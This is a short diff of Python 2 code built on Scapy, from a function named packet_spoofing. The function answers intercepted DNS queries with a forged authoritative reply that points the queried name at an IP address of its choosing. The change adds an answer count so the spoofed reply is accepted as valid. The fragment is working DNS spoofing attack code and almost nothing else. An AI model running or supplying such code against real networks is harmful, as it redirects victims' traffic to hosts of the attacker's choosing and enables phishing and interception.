@@ -64,7 +64,7 @@ def packet_spoofing(pack):
         ip_to_redirect = get_ip_to_redirect(query_name)
         sf_pkt = IP(dst=pack[IP].src, src=pack[IP].dst) / \
                  UDP(dport=pack[UDP].sport, sport=pack[UDP].dport) / \
-                 DNS(id=pack[DNS].id, qd=pack[DNS].qd, aa=1, qr=1,
+                 DNS(ancount =1,id=pack[DNS].id, qd=pack[DNS].qd, aa=1, qr=1,
                      an=DNSRR(rrname=pack[DNS].qd.qname, rdata=ip_to_redirect, ttl=15))
         send(sf_pkt)
         print "New packet is ", pack.summary()
